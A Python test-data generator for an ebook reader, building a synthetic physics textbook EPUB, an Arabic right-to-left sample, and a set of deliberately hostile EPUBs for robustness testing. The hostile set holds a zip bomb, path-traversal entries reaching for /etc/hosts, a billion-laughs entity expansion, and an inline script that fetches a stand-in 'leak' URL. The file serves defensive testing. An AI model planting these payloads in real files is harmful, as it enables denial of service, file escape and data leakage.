"""Generates self-made EPUBs for the Phase 2 pagination spike and the EPUB robustness tests.

Standard library only, so there is no tool to install. The content is our own (MIT) and deterministic, so the files
do not need to be committed: regenerate them when needed.

  synthetic-textbook.epub  about 1,500 screen pages in the shape the Phase 3 converter will emit
                           (docs/conversion-spec.md): headings, paragraphs, lists, merged-cell tables, SVG figures,
                           MathML (display and inline, with LaTeX annotations), sidebars, footnotes, page breaks,
                           a page list and landmarks.
  rtl-sample.epub          Arabic text, page-progression-direction="rtl".
  hostile-*.epub           damaged and hostile books: a zip bomb, path traversal, XML entity expansion, missing
                           files, broken markup, scripts and remote resources, DRM, no container.

Usage:  python -I tools/testepubs/make_test_epubs.py samples/corpus/cache/epub-generated
"""

from __future__ import annotations

import random
import sys
import zipfile
from pathlib import Path
from xml.sax.saxutils import escape

CONTAINER = """<?xml version="1.0" encoding="UTF-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles>
</container>
"""

CSS = """:root { --ff-accent: #1f6f8b; }
body { font-family: serif; line-height: 1.45; margin: 0; }
h1 { font-size: 1.8em; color: var(--ff-accent); margin: 0 0 0.6em; }
h2 { font-size: 1.35em; margin: 1.2em 0 0.4em; }
h3 { font-size: 1.1em; margin: 1em 0 0.3em; }
p { margin: 0 0 0.6em; text-align: justify; hyphens: auto; }
figure { margin: 1em 0; text-align: center; }
figcaption { font-size: 0.85em; font-style: italic; }
table { border-collapse: collapse; margin: 1em auto; font-size: 0.9em; }
th, td { border: 1px solid #888; padding: 0.2em 0.5em; }
aside.sidebar { border-left: 4px solid var(--ff-accent); padding: 0.4em 0.8em; margin: 1em 0; background: #eef5f8; }
aside.footnote { font-size: 0.85em; }
math[display="block"] { display: block; margin: 0.8em 0; }
"""

WORDS = [
    "force",
    "mass",
    "acceleration",
    "velocity",
    "momentum",
    "energy",
    "work",
    "power",
    "field",
    "charge",
    "current",
    "potential",
    "wave",
    "frequency",
    "period",
    "amplitude",
    "displacement",
    "vector",
    "scalar",
    "component",
    "friction",
    "tension",
    "gravity",
    "orbit",
    "torque",
    "inertia",
    "rotation",
    "equilibrium",
    "pressure",
    "density",
    "volume",
    "temperature",
    "heat",
    "entropy",
    "system",
    "particle",
    "collision",
    "impulse",
    "spring",
    "oscillation",
    "resonance",
    "the",
    "a",
    "of",
    "and",
    "to",
    "in",
    "is",
    "that",
    "for",
    "as",
    "with",
    "by",
    "on",
    "this",
    "are",
    "be",
    "from",
    "at",
    "which",
    "an",
    "it",
    "can",
    "we",
    "these",
    "their",
    "its",
    "when",
    "where",
    "then",
    "thus",
    "therefore",
    "however",
    "because",
    "so",
    "each",
    "two",
    "three",
    "both",
    "between",
    "into",
    "through",
]


def sentence(rng: random.Random) -> str:
    words = [rng.choice(WORDS) for _ in range(rng.randint(8, 22))]
    words[0] = words[0].capitalize()
    return " ".join(words) + rng.choice([".", ".", ".", "?", ";"]).replace(";", ".")


def paragraph(rng: random.Random, sentences: int | None = None) -> str:
    return " ".join(sentence(rng) for _ in range(sentences or rng.randint(3, 7)))


def mathml_display(n: int) -> str:
    return (
        f'<math xmlns="http://www.w3.org/1998/Math/MathML" display="block" id="eq-{n}"><semantics><mrow>'
        "<mi>F</mi><mo>=</mo><mfrac><mrow><mi>d</mi><mi>p</mi></mrow><mrow><mi>d</mi><mi>t</mi></mrow></mfrac>"
        "<mo>=</mo><msqrt><msup><mi>a</mi><mn>2</mn></msup><mo>+</mo><msup><mi>b</mi><mn>2</mn></msup></msqrt>"
        "</mrow>"
        '<annotation encoding="application/x-tex">F = \\frac{dp}{dt} = \\sqrt{a^2 + b^2}</annotation>'
        "</semantics></math>"
    )


MATH_INLINE = (
    '<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>0</mn></msub>'
    "<mo>+</mo><mi>a</mi><mi>t</mi></mrow>"
    '<annotation encoding="application/x-tex">v_0 + at</annotation></semantics></math>'
)


def svg_figure(n: int) -> str:
    return (
        '<svg xmlns="http://www.w3.org/2000/svg" width="300" height="160" viewBox="0 0 300 160" role="img">'
        '<rect x="1" y="1" width="298" height="158" fill="none" stroke="#1f6f8b"/>'
        '<line x1="20" y1="140" x2="280" y2="140" stroke="#333"/><line x1="20" y1="140" x2="20" y2="20" stroke="#333"/>'
        f'<polyline fill="none" stroke="#c0392b" stroke-width="2" points="20,140 80,{100 - n % 40} 140,70 200,{50 + n % 30} 270,30"/>'
        '<text x="150" y="155" font-size="10" text-anchor="middle">time (s)</text>'
        "</svg>"
    )


TABLE = """<table id="{id}"><caption>Table {n}: measured values</caption>
<thead><tr><th rowspan="2">Trial</th><th colspan="2">Position (m)</th><th rowspan="2">Time (s)</th></tr>
<tr><th>start</th><th>end</th></tr></thead>
<tbody><tr><td>1</td><td>0.00</td><td>1.25</td><td>0.50</td></tr>
<tr><td>2</td><td colspan="2">not recorded</td><td>0.62</td></tr>
<tr><td>3</td><td>0.10</td><td>2.40</td><td>0.81</td></tr></tbody></table>"""


def xhtml(title: str, body: str, lang: str = "en", direction: str = "ltr") -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE html>\n'
        f'<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" lang="{lang}" '
        f'xml:lang="{lang}" dir="{direction}"><head><meta charset="UTF-8"/><title>{escape(title)}</title>'
        '<link rel="stylesheet" type="text/css" href="book.css"/></head>'
        f"<body>{body}</body></html>\n"
    )


def textbook_chapter(ch: int, rng: random.Random, page: list[int], pages: list[tuple[str, str]]) -> str:
    """One chapter of about 50 screen pages at the default size. Records page breaks in [pages]."""
    out: list[str] = []
    block = 0

    def bid() -> str:
        nonlocal block
        block += 1
        return f"p{page[0]:04d}-b{block:03d}"

    def page_break() -> None:
        page[0] += 1
        label = str(page[0])
        out.append(
            f'<span epub:type="pagebreak" role="doc-pagebreak" id="page-{label}" title="{label}" '
            f'data-ff-page="{label}"/>'
        )
        pages.append((label, f"ch{ch:02d}.xhtml#page-{label}"))

    page_break()
    out.append(f'<h1 id="{bid()}">Chapter {ch}: {" ".join(rng.choice(WORDS) for _ in range(3)).title()}</h1>')
    for sec in range(1, 7):
        out.append(f'<h2 id="{bid()}">{ch}.{sec} {" ".join(rng.choice(WORDS) for _ in range(4)).title()}</h2>')
        for k in range(rng.randint(10, 14)):
            if k % 4 == 3:
                page_break()
            out.append(f'<p id="{bid()}">{paragraph(rng)}</p>')
            if k == 2:
                out.append(f'<p id="{bid()}">With {MATH_INLINE} as the velocity, {paragraph(rng, 2)}</p>')
                out.append(mathml_display(ch * 100 + sec))
            if k == 4:
                n = ch * 10 + sec
                out.append(
                    f'<figure id="{bid()}">{svg_figure(n)}<figcaption>Figure {ch}.{sec}: {sentence(rng)}</figcaption></figure>'
                )
            if k == 6:
                out.append(f'<ul id="{bid()}">' + "".join(f"<li>{sentence(rng)}</li>" for _ in range(4)) + "</ul>")
            if k == 7:
                out.append(TABLE.format(id=bid(), n=f"{ch}.{sec}"))
            if k == 8:
                out.append(
                    f'<aside epub:type="sidebar" role="doc-example" class="sidebar" id="{bid()}">'
                    f"<h3>Example {ch}.{sec}</h3><p>{paragraph(rng)}</p></aside>"
                )
            if k == 9:
                fn = f"fn-{ch}-{sec}"
                out.append(
                    f'<p id="{bid()}">{paragraph(rng, 2)}<a epub:type="noteref" role="doc-noteref" href="#{fn}">'
                    f"{sec}</a> {sentence(rng)}</p>"
                    f'<aside epub:type="footnote" role="doc-footnote" class="footnote" id="{fn}"><p>{sentence(rng)}</p></aside>'
                )
    return xhtml(f"Chapter {ch}", "".join(out))


def opf(
    title: str,
    ident: str,
    items: list[tuple[str, str, str]],
    spine: list[str],
    direction: str = "ltr",
    lang: str = "en",
) -> str:
    manifest = "".join(
        f'<item id="{i}" href="{h}" media-type="{m}"{' properties="nav"' if i == "nav" else ""}'
        f"{' properties="svg mathml"' if i.startswith('ch') else ''}/>"
        for i, h, m in items
    )
    refs = "".join(f'<itemref idref="{s}"/>' for s in spine)
    ppd = f' page-progression-direction="{direction}"' if direction == "rtl" else ""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid" xml:lang="en">'
        '<metadata xmlns:dc="http://purl.org/dc/elements/1.1/">'
        f'<dc:identifier id="uid">{ident}</dc:identifier><dc:title>{escape(title)}</dc:title>'
        f"<dc:language>{lang}</dc:language><dc:creator>FlowFolio test generator</dc:creator>"
        '<meta property="dcterms:modified">2026-10-20T00:00:00Z</meta></metadata>'
        f"<manifest>{manifest}</manifest><spine{ppd}>{refs}</spine></package>\n"
    )


def nav(toc: list[tuple[str, str]], pages: list[tuple[str, str]], lang: str = "en") -> str:
    toc_li = "".join(f'<li><a href="{h}">{escape(t)}</a></li>' for t, h in toc)
    page_li = "".join(f'<li><a href="{h}">{escape(p)}</a></li>' for p, h in pages)
    body = (
        f'<nav epub:type="toc" id="toc"><h1>Contents</h1><ol>{toc_li}</ol></nav>'
        f'<nav epub:type="page-list" hidden=""><ol>{page_li}</ol></nav>'
        f'<nav epub:type="landmarks" hidden=""><ol><li><a epub:type="bodymatter" href="{toc[0][1]}">Start</a></li></ol></nav>'
    )
    return xhtml("Contents", body, lang)


def write_epub(path: Path, files: dict[str, str | bytes], extra: list[tuple[zipfile.ZipInfo, bytes]] = ()) -> None:
    with zipfile.ZipFile(path, "w") as z:
        z.writestr(zipfile.ZipInfo("mimetype"), "application/epub+zip", compress_type=zipfile.ZIP_STORED)
        for name, data in files.items():
            z.writestr(name, data, compress_type=zipfile.ZIP_DEFLATED)
        for info, data in extra:
            z.writestr(info, data)


def textbook(out: Path, chapters: int = 60) -> None:
    rng = random.Random(20261020)
    page = [0]
    pages: list[tuple[str, str]] = []
    files: dict[str, str | bytes] = {"META-INF/container.xml": CONTAINER, "OEBPS/book.css": CSS}
    items = [("nav", "nav.xhtml", "application/xhtml+xml"), ("css", "book.css", "text/css")]
    toc = []
    for ch in range(1, chapters + 1):
        files[f"OEBPS/ch{ch:02d}.xhtml"] = textbook_chapter(ch, rng, page, pages)
        items.append((f"ch{ch:02d}", f"ch{ch:02d}.xhtml", "application/xhtml+xml"))
        toc.append((f"Chapter {ch}", f"ch{ch:02d}.xhtml"))
    files["OEBPS/nav.xhtml"] = nav(toc, pages)
    files["OEBPS/content.opf"] = opf(
        "Synthetic Textbook", "urn:flowfolio:synthetic-textbook", items, [f"ch{c:02d}" for c in range(1, chapters + 1)]
    )
    write_epub(out / "synthetic-textbook.epub", files)


ARABIC = [
    "القوة",
    "تساوي",
    "الكتلة",
    "في",
    "التسارع",
    "وهذا",
    "هو",
    "القانون",
    "الثاني",
    "لنيوتن",
    "الذي",
    "يصف",
    "حركة",
    "الأجسام",
]


def rtl(out: Path) -> None:
    rng = random.Random(7)
    files: dict[str, str | bytes] = {"META-INF/container.xml": CONTAINER, "OEBPS/book.css": CSS}
    items = [("nav", "nav.xhtml", "application/xhtml+xml"), ("css", "book.css", "text/css")]
    toc, pages = [], []
    for ch in range(1, 4):
        paras = "".join(
            "<p>" + " ".join(rng.choice(ARABIC) for _ in range(rng.randint(30, 60))) + ".</p>" for _ in range(25)
        )
        pages.append((str(ch), f"ch{ch:02d}.xhtml#page-{ch}"))
        body = f'<span epub:type="pagebreak" id="page-{ch}" title="{ch}"/><h1>الفصل {ch}</h1>{paras}'
        files[f"OEBPS/ch{ch:02d}.xhtml"] = xhtml(f"الفصل {ch}", body, "ar", "rtl")
        items.append((f"ch{ch:02d}", f"ch{ch:02d}.xhtml", "application/xhtml+xml"))
        toc.append((f"الفصل {ch}", f"ch{ch:02d}.xhtml"))
    files["OEBPS/nav.xhtml"] = nav(toc, pages, "ar")
    files["OEBPS/content.opf"] = opf("كتاب تجريبي", "urn:flowfolio:rtl", items, ["ch01", "ch02", "ch03"], "rtl", "ar")
    write_epub(out / "rtl-sample.epub", files)


def minimal(body: str = "<p>Hello.</p>", opf_text: str | None = None) -> dict[str, str | bytes]:
    items = [("nav", "nav.xhtml", "application/xhtml+xml"), ("ch01", "ch01.xhtml", "application/xhtml+xml")]
    return {
        "META-INF/container.xml": CONTAINER,
        "OEBPS/nav.xhtml": nav([("One", "ch01.xhtml")], [("1", "ch01.xhtml")]),
        "OEBPS/ch01.xhtml": xhtml("One", body),
        "OEBPS/content.opf": opf_text or opf("Minimal", "urn:flowfolio:minimal", items, ["ch01"]),
    }


def hostile(out: Path) -> None:
    # 1. Zip bomb: one entry that inflates to 512 MB from about 0.5 MB.
    bomb = minimal()
    info = zipfile.ZipInfo("OEBPS/ch01.xhtml")
    info.compress_type = zipfile.ZIP_DEFLATED
    del bomb["OEBPS/ch01.xhtml"]
    write_epub(out / "hostile-zip-bomb.epub", bomb, [(info, b"\0" * (512 * 1024 * 1024))])

    # 2. Path traversal: an entry and a manifest href that point outside the book.
    files = minimal()
    files["../../evil.txt"] = "outside"
    items = [("nav", "nav.xhtml", "application/xhtml+xml"), ("ch01", "../../../../etc/hosts", "application/xhtml+xml")]
    files["OEBPS/content.opf"] = opf("Traversal", "urn:flowfolio:traversal", items, ["ch01"])
    write_epub(out / "hostile-path-traversal.epub", files)

    # 3. XML entity expansion ("billion laughs") in the package document.
    lol = (
        '<!DOCTYPE package [<!ENTITY a "aaaaaaaaaa">'
        + "".join(f'<!ENTITY {chr(98 + i)} "{("&" + chr(97 + i) + ";") * 10}">' for i in range(9))
        + "]>"
    )
    files = minimal()
    files["OEBPS/content.opf"] = (
        files["OEBPS/content.opf"].replace("?>\n", "?>\n" + lol, 1).replace("<dc:title>Minimal", "<dc:title>&j;", 1)
    )
    write_epub(out / "hostile-entity-expansion.epub", files)

    # 4. Missing files: the spine names a chapter that is not in the zip.
    files = minimal()
    del files["OEBPS/ch01.xhtml"]
    write_epub(out / "hostile-missing-files.epub", files)

    # 5. Broken markup: unclosed tags and stray bytes.
    write_epub(out / "hostile-broken-markup.epub", minimal("<p>Unclosed <b>bold <i>italic</p><div>\x01\x02</span>"))

    # 6. Scripts and remote resources, which must never run or load.
    write_epub(
        out / "hostile-script-remote.epub",
        minimal(
            '<p onclick="alert(1)">Tap</p><script>fetch("https://example.invalid/leak")</script>'
            '<img src="https://example.invalid/pixel.png" alt="remote"/>'
            '<iframe src="https://example.invalid/"></iframe>'
        ),
    )

    # 7. DRM: an encryption.xml that encrypts the content (Adobe ADEPT style), which the app must refuse.
    files = minimal()
    files["META-INF/encryption.xml"] = (
        '<?xml version="1.0"?><encryption xmlns="urn:oasis:names:tc:opendocument:xmlns:container" '
        'xmlns:enc="http://www.w3.org/2001/04/xmlenc#"><enc:EncryptedData><enc:EncryptionMethod '
        'Algorithm="http://www.w3.org/2001/04/xmlenc#aes128-cbc"/><enc:CipherData>'
        '<enc:CipherReference URI="OEBPS/ch01.xhtml"/></enc:CipherData></enc:EncryptedData></encryption>'
    )
    write_epub(out / "hostile-drm.epub", files)

    # 8. No container.xml at all.
    files = minimal()
    del files["META-INF/container.xml"]
    write_epub(out / "hostile-no-container.epub", files)


def main() -> None:
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "samples/corpus/cache/epub-generated")
    out.mkdir(parents=True, exist_ok=True)
    textbook(out)
    rtl(out)
    hostile(out)
    for f in sorted(out.glob("*.epub")):
        print(f"{f.name:34} {f.stat().st_size:>10,} bytes")


if __name__ == "__main__":
    main()
